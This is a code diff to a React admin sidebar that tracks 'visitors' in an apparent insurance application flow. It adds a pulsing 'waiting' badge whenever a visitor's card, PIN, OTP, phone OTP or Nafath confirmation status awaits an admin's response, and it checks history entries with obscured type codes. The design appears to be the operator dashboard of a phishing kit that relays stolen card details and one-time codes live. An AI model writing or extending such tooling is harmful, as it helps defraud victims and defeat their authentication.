@@ -22,12 +22,24 @@ interface VisitorSidebarProps {
 
 // Check if visitor is waiting for admin response
 const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
-  return (
+  // Check main status fields
+  if (
     visitor.cardStatus === "waiting" ||
     visitor.otpStatus === "waiting" ||
     visitor.pinStatus === "waiting" ||
+    visitor.phoneOtpStatus === "waiting" ||
     visitor.nafadConfirmationStatus === "waiting"
-  )
+  ) return true;
+
+  // Check history for any pending entries that need action
+  if (visitor.history && Array.isArray(visitor.history)) {
+    return visitor.history.some(entry => 
+      entry.status === "pending" && 
+      (entry.type === "otp" || entry.type === "phone_otp" || entry.type === "card" || entry.type === "pin" || entry.type === "_t1" || entry.type === "_t2" || entry.type === "_t3" || entry.type === "_t5")
+    );
+  }
+
+  return false;
 }
 
 // Get current page name in Arabic
@@ -195,10 +207,13 @@ export function VisitorSidebar({
                   <div className="flex items-center justify-between mb-1">
                     <div className="flex items-center gap-2 flex-1 min-w-0">
                       <h3 className="font-semibold text-gray-900 truncate text-base landscape:text-sm">{visitor.ownerName}</h3>
+                      {isWaitingForAdmin(visitor) && (
+                        <span className="flex items-center gap-1 text-[10px] font-bold text-white bg-red-500 px-1.5 py-0.5 rounded-full animate-pulse shadow-sm">
+                          <RefreshCw className="w-2.5 h-2.5 animate-spin" />
+                          انتظار
+                        </span>
+                      )}
                       <span className="flex items-center gap-1 text-xs font-medium text-white bg-teal-600 px-2 py-0.5 rounded whitespace-nowrap">
-                        {isWaitingForAdmin(visitor) && (
-                          <RefreshCw className="w-3 h-3 animate-spin" />
-                        )}
                         {getPageName(visitor.currentStep)}
                       </span>
                     </div>
